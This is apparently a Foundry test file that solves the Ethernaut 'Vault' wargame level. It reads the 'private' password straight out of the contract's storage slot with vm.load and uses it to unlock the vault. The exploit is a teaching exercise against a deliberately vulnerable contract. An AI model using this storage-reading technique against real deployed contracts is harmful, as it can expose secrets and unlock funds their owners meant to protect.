// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../ethernaut/Vault.sol";


contract TestVault is Test {
    Vault vault;

    function setUp() external {
        vault = new Vault(bytes32(bytes("sdbhkq7")));
    }

    function testExploit() external {
        assertEq(vault.locked(), true);
        bytes32 password = vm.load(address(vault), bytes32(uint(1)));
        vault.unlock(password);
        assertEq(vault.locked(), false);
    }
}
